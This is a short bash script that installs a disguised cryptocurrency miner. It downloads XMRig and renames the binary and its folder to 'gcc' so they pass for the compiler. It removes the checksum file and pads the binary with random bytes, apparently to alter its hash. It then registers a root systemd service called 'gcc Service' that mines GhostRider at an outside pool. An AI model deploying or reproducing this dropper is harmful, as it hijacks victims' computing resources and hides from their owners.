#!/bin/bash

U=$1
latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
tar -zxvf 1.tar.gz
mv xmrig-$latest gcc
mv gcc/xmrig gcc/gcc
mv gcc /etc/gcc
rm -rf 1.tar.gz
cd /etc/gcc && rm -rf SHA256SUMS
random_number=$((RANDOM % 2088 + 208))
for i in $(seq 1 $random_number); do
  echo -n "0" >> /etc/gcc/gcc
done
cat > /etc/systemd/system/gcc.service <<EOL
[Unit]
Description=gcc Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/gcc/gcc -a gr -o stratum+ssl://ghostrider.100861000.xyz:443 -u $1 -p x
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable gcc.service
systemctl start gcc.service
sleep 2
systemctl status gcc.service
#/etc/gcc/gcc -a gr -o stratum+ssl://ghostrider.100861000.xyz:443 -u $U -p x
